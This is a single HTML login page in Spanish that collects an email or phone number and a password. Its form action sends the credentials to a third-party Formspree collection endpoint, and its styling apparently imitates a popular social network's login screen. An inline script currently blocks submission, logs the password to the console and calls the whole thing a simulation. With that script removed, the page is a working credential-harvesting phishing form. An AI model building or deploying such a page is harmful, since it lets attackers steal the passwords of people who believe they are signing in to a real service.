<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="login-container">
        <h2>Iniciar sesión</h2>
        <form id="loginForm" action="https://formspree.io/f/xyzglnyk" method="POST">
            <label for="contactType">Iniciar sesión con:</label>
            <div>
                <label>
                    <input type="radio" name="contactType" value="email" checked> Correo electrónico
                </label>
                <label>
                    <input type="radio" name="contactType" value="phone"> Teléfono
                </label>
            </div>
            
            <label for="contact">Correo electrónico / Teléfono</label>
            <input type="text" id="contact" name="contact" required>

            <label for="password">Contraseña</label>
            <input type="password" id="password" name="password" required>

            <button type="submit">Iniciar sesión</button>
        </form>
    </div>
    <script>
    // script.js
    document.getElementById('loginForm').addEventListener('submit', function(event) {
        event.preventDefault(); // Evita el envío del formulario

        const contactType = document.querySelector('input[name="contactType"]:checked').value;
        const contact = document.getElementById('contact').value;
        const password = document.getElementById('password').value;

        // Muestra los datos en la consola
        console.log('Tipo de contacto:', contactType);
        console.log('Contacto:', contact);
        console.log('Contraseña:', password);

        // Simula un mensaje de éxito
        alert('Datos enviados (esto es solo una simulación)');
    });
    </script>
    <style>
    /* styles.css */
    body {
        font-family: Arial, sans-serif;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        background-color: #f0f2f5;
    }

    .login-container {
        background-color: #ffffff;
        padding: 20px;
        border-radius: 8px;
        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        width: 300px;
    }

    h2 {
        margin-bottom: 20px;
    }

    label {
        display: block;
        margin-bottom: 5px;
    }

    input[type="text"],
    input[type="password"] {
        width: 100%;
        padding: 10px;
        margin-bottom: 15px;
        border: 1px solid #ccc;
        border-radius: 4px;
    }

    input[type="radio"] {
        margin-right: 5px;
    }

    button {
        width: 100%;
        padding: 10px;
        background-color: #1877f2;
        color: #fff;
        border: none;
        border-radius: 4px;
        cursor: pointer;
    }

    button:hover {
        background-color: #1558b0;
    }
    </style>
</body>
</html>
